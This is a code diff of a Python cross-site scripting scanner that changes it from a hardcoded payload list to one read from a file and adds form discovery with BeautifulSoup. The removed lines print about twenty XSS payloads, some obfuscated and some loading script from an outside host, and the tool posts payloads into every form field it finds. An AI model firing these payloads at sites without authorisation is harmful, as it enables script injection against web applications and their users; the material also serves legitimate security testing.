@@ -1,41 +1,38 @@
 import requests
 import sys
+from bs4 import BeautifulSoup
 
-def test_xss(url, fields):
-    payloads = [
-        "';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode",
-        "<script>alert('xss')</script>",
-        "--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
-        "'';!--\"<XSS>=&{}()",
-        "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
-        "<IMG SRC=\"javascript:alert('XSS');\">",
-        "<IMG SRC=javascript:alert('XSS')>",
-        "<IMG SRC=javascrscriptipt:alert('XSS')>",
-        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
-        "<IMG \"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"",
-        "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
-        "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
-        "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
-        "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
-        "<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>",
-        "\";alert('XSS');//",
-        "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
-        "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
-        "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
-        "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
-        "<DIV STYLE=\"width: expression(alert('XSS'));\">"
-    ]
 
-    for field in fields:
-        for payload in payloads:
-            r = requests.post(url, data={field: payload})
+def test_xss(url, payloads_file):
+    # Read the payloads from the file
+    with open(payloads_file, 'r') as f:
+        payloads = [line.strip() for line in f]
 
-            if payload in r.text:
-                print(f'XSS Vulnerability detected in {field} with payload: {payload}')
+    # Get the page content
+    response = requests.get(url)
+
+    # Create a Beautiful Soup object and find the form
+    soup = BeautifulSoup(response.text, 'html.parser')
+    forms = soup.find_all('form')
+
+    for form in forms:
+        # Find all input fields in the form
+        inputs = form.find_all('input')
+        fields = [input.get('name') for input in inputs]
+
+        # Get the action attribute of the form (this is the submit URL)
+        action = form.get('action')
+
+        for field in fields:
+            for payload in payloads:
+                r = requests.post(url + action, data={field: payload})
+
+                if payload in r.text:
+                    print(f'XSS Vulnerability detected in {field} with payload: {payload}')
 
 
 if __name__ == "__main__":
     url = sys.argv[1]  # The first command line argument is the URL
-    fields = sys.argv[2:]  # The rest of the command line arguments are the fields
+    payloads_file = sys.argv[2]  # The second command line argument is the payloads file
 
-    test_xss(url, fields)
+    test_xss(url, payloads_file)
